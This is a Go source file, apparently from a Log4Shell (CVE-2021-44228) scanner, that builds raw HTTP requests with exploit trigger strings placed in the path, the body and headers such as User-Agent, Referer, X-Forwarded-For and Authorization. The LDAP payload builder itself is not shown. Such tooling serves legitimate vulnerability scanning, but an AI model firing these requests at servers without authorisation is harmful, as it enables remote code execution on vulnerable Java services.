package hello

import (
	"bytes"
	"fmt"
	"io"
	"net"
	"net/http"
	"strings"
	"time"
)

const (
	pathCookieInfo uint16 = iota + 10
	bodyCookieInfo
)

var headerNameInfo = map[string]uint16{
	"User-Agent":      1,
	"Referer":         2,
	"X-Forwarded-For": 3,
	"Cookie":          4,
	"Authorization":   5,
	"X-Api-Version":   6,
	"X-Real-IP":       7,
	"Accept-Encoding": 8,
}

// httpBuilder builds http requests containing log4shell exploit strings.
type httpBuilder struct {
	ldapBuilder
	headers map[string]uint16
	path    bool
	body    bool
}

// NewHTTPBuilder creates a new builder for building http requests.
func NewHTTPBuilder(ldapBuilder ldapBuilder, headers []string, path, body bool) httpBuilder {
	headerMap := make(map[string]uint16)
	for _, header := range headers {
		headerMap[header] = getHeaderNameInfo(header)
	}

	return httpBuilder{
		ldapBuilder: ldapBuilder,
		headers:     headerMap,
		path:        path,
		body:        body,
	}
}

// Hello builds an HTTP request containing log4shell exploit strings in path, headers and body, if set.
func (h httpBuilder) Hello(ip net.IP, port uint16) ([]byte, error) {
	timestamp := time.Now()

	url := fmt.Sprintf("http://%s:%d/", ip.String(), port)
	if h.path {
		url += h.ldapBuilder.trigger(ip, port, pathCookieInfo, timestamp)
	}

	var body io.Reader
	if h.body {
		body = bytes.NewReader([]byte(h.ldapBuilder.trigger(ip, port, bodyCookieInfo, timestamp)))
	}

	req, err := http.NewRequest("GET", url, body)
	if err != nil {
		return nil, err
	}

	for header, cookieInfo := range h.headers {
		value := h.ldapBuilder.trigger(ip, port, cookieInfo, timestamp)
		req.Header.Set(header, value)
	}
	req.Header.Set("Connection", "close")

	var buf bytes.Buffer
	if err := req.Write(&buf); err != nil {
		return nil, err
	}

	return buf.Bytes(), nil
}

func getHeaderNameInfo(header string) uint16 {
	for name, info := range headerNameInfo {
		if !strings.EqualFold(name, header) {
			continue
		}
		return info
	}

	return 0
}
